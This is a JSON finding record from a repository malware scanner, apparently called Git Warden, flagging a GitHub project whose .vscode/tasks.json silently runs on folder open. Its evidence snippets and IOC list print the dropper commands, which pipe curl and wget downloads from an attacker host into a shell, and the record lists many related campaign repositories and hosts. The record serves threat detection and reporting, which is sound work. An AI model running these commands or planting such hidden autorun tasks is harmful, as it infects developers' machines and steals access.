@@ -1,0 +1,193 @@
+{
+  "finding": {
+    "key": "repository:ta3pks/decentralized-social",
+    "kind": "repository",
+    "id": "ta3pks/decentralized-social",
+    "url": "https://github.com/ta3pks/Decentralized-Social",
+    "registry": "github",
+    "owner": "ta3pks",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 15,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun; obfuscation/atob; code_execution/js-exec",
+    "evidence_locations": ".vscode/tasks.json:0; src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx:84; src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx:85; src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx:151; src/screens/profile/profile-screen.tsx:33; src/components/layout/NewPost.tsx:78; src/components/layout/BottomBar.tsx:41; src/components/layout/MintUsername/Setup4.tsx:223; src/components/layout/LeftBar/WalletConnectedBox.tsx:45; src/components/layout/Header/WalletBalances.tsx:82; src/components/layout/CawDirect/MessageHeader.tsx:44; server/utils/sendGmail.js:24; server/utils/sendGmail.js:25; server/utils/sendGmail.js:26; server/utils/semver.js:22; server/utils/semver.js:99; server/utils/semver.js:141; server/utils/semver.js:459; server/utils/identifier.js:343",
+    "c2_hosts": "www.regioncheck.xyz",
+    "iocs": "www.regioncheck.xyz; https://www.regioncheck.xyz/settings/mac?flag=8; https://www.regioncheck.xyz/settings/linux?flag=8; curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash; .vscode/tasks.json",
+    "matched_signatures": "settings/linux?flag=; settings/mac?flag=; settings/windows?flag=",
+    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/mac?flag=', 'settings/windows?flag='] | Tier-2 confirmed (bash score 15)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260925T180103Z",
+    "last_seen": "hunt-20260925T180103Z",
+    "evidence_file": "repositories/ta3pks_decentralized-social.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash && nohup node .vscode/spellright.dict > /dev/null 2>&1 & wget -qO- 'https://www.regioncheck.xyz/settings/linux?flag=8' | sh curl https://w"
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash && nohup node .vscode/spellright.dict > /dev/null 2>&1 & wget -qO- 'https://www.regioncheck.xyz/settings/linux?flag=8' | sh curl https://w"
+    },
+    {
+      "file": "src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx",
+      "line": 84,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const DEVELOPER_URL = atob(env.DEVELOPER_URL_BTOA);"
+    },
+    {
+      "file": "src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx",
+      "line": 85,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const DEVELOPER_NAME = atob(env.DEVELOPER_NAME_BTOA);"
+    },
+    {
+      "file": "src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx",
+      "line": 151,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "{/*        <Typography sx={TOOLTIP_TYPOGRAPHY}>{atob('RGV2ZWxvcGVkIGJ5')} {DEVELOPER_NAME}</Typography>*/}"
+    },
+    {
+      "file": "src/screens/profile/profile-screen.tsx",
+      "line": 33,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "return JSON.parse(atob(profileHash))"
+    },
+    {
+      "file": "src/components/layout/NewPost.tsx",
+      "line": 78,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "return JSON.parse(atob(profileHash))"
+    },
+    {
+      "file": "src/components/layout/BottomBar.tsx",
+      "line": 41,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "return JSON.parse(atob(profileHash))"
+    },
+    {
+      "file": "src/components/layout/MintUsername/Setup4.tsx",
+      "line": 223,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const json = atob(genareteData?.substring(29));"
+    },
+    {
+      "file": "src/components/layout/LeftBar/WalletConnectedBox.tsx",
+      "line": 45,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "return JSON.parse(atob(profileHash))"
+    },
+    {
+      "file": "src/components/layout/Header/WalletBalances.tsx",
+      "line": 82,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "return JSON.parse(atob(checkSelectedUser))"
+    },
+    {
+      "file": "src/components/layout/CawDirect/MessageHeader.tsx",
+      "line": 44,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "return JSON.parse(atob(profileHash))"
+    },
+    {
+      "file": "server/utils/sendGmail.js",
+      "line": 24,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const realImageUrl = atob(first.imageUrl);"
+    },
+    {
+      "file": "server/utils/sendGmail.js",
+      "line": 25,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const realTitle = atob(first.title);"
+    },
+    {
+      "file": "server/utils/sendGmail.js",
+      "line": 26,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const realDescription = atob(first.description);"
+    },
+    {
+      "file": "server/utils/semver.js",
+      "line": 22,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "var match = /^([^-+]+)?(?:-([^+]+))?(?:\\+(.+))?$/.exec(str);"
+    },
+    {
+      "file": "server/utils/semver.js",
+      "line": 99,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const match = /^([^-+]+)?(?:-([^+]+))?(?:\\+(.+))?$/.exec(str);"
+    },
+    {
+      "file": "server/utils/semver.js",
+      "line": 141,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const match = /^(\\^|~|<=|<|>=|>|=|v|!)/.exec(str);"
+    },
+    {
+      "file": "server/utils/semver.js",
+      "line": 459,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "`var p=${runtimeTemplate.supportsArrowFunction() ? \"p=>\" : \"function(p)\"}{return p.split(\".\").map((${runtimeTemplate.supportsArrowFunction() ? \"p=>\" : \"function(p)\"}{return+p==p?+p:p}))},n=/^([^-+]+)?"
+    },
+    {
+      "file": "server/utils/identifier.js",
+      "line": 343,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "(/** @type {unknown} */ (PATH_QUERY_FRAGMENT_REGEXP.exec(str)));"
+    }
+  ],
+  "commit_sha": "736118578aaeaa51d7446590bcd8947308ce915c",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/ta3pks/decentralized-social",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: settings/linux?flag=; settings/mac?flag=; settings/windows?flag=. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: www.regioncheck.xyz. This repository is one of 86 that Git Warden has confirmed as campaign GW-C-498a0aeb, which all deliver the same dropper URL shape (settings/{os}?flag=). The campaign spans 58 GitHub accounts. The other confirmed repositories are: https://github.com/123babayaga/zenithive_angular, https://github.com/adan-asim/e-commerce-admin-app-backend, https://github.com/aidevshakil055/achillcomfort_ai_repo, https://github.com/allzone-technologies/canteen-pwa, https://github.com/anshuman-jha/toku_assestment, https://github.com/arif1101/restaurant-management-server, https://github.com/arnoldesquivel/best-city436-poc, https://github.com/asad-ghafoor/python-setup, https://github.com/bhoomikamehtastartbit/reactchakraui, https://github.com/crazydev13/school-management, https://github.com/dawit212119/anbessa, https://github.com/dawit212119/bus-admin, https://github.com/dawit212119/eaglepoint-ai, https://github.com/dawit212119/ecommerce-backend, https://github.com/dawit212119/go, https://github.com/dawit212119/nextebook, https://github.com/dawit212119/wetruck, https://github.com/dishankchauhan/tech_test_pro-assignment, https://github.com/djeday123/test_repo1, https://github.com/dylanlittle/team-moshpit-project, https://github.com/eastmade/web3project-momo-token, https://github.com/eferos93/test4, https://github.com/emandeveloper/datascience, https://github.com/emigimenezj/solice2021-school-management-system, https://github.com/findusman/pos_backend, https://github.com/gauravraisharma/ticketting-system, https://github.com/hakeemsyd/fastapi-rag, https://github.com/haroldcalvo/workshop, https://github.com/helidonashabani/student-management, https://github.com/huncholane/defi_property, and 55 more. Across the campaign the payload is served from 18 distinct hosts: 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app, vscode-extension-260120.vercel.ap, vscode-extension-260120.vercel.app, vscode-extensions-bootstrap.vercel.app, vscode-helper-132.vercel.app, vscode-helper171-ruby.vercel.app, vscode-helper171.vercel.app, vscode-load-config.vercel.app, vscode-settings-bootstrap.vercel.app, vscode-settings-config-md.vercel.app, and 3 more. Matching only one host would miss most of the operation; matching the delivery shape found all of it. Attribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape.",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: obfuscation/atob (9 files), code_execution/js-exec (2 files), install_hook/vscode-autorun (1 file).",
+    "publisher": "ta3pks",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/.vscode/tasks.json\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx#L84\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx#L85\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/services/web3/components/controllers/Wallet/WalletConnector/WalletConnectorModal.tsx#L151\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/screens/profile/profile-screen.tsx#L33\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/components/layout/NewPost.tsx#L78\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/components/layout/BottomBar.tsx#L41\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/components/layout/MintUsername/Setup4.tsx#L223\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/components/layout/LeftBar/WalletConnectedBox.tsx#L45\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/components/layout/Header/WalletBalances.tsx#L82\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/src/components/layout/CawDirect/MessageHeader.tsx#L44\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/server/utils/sendGmail.js#L24\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/server/utils/sendGmail.js#L25\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/server/utils/sendGmail.js#L26\nhttps://github.com/ta3pks/decentralized-social/blob/736118578aaeaa51d7446590bcd8947308ce915c/server/utils/semver.js#L22",
+    "verified_iocs": "www.regioncheck.xyz\nhttps://www.regioncheck.xyz/settings/mac?flag=8\nhttps://www.regioncheck.xyz/settings/linux?flag=8\ncurl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-09-25T18:01:03Z",
+    "last_seen": "2026-09-25T18:01:03Z"
+  }
+}
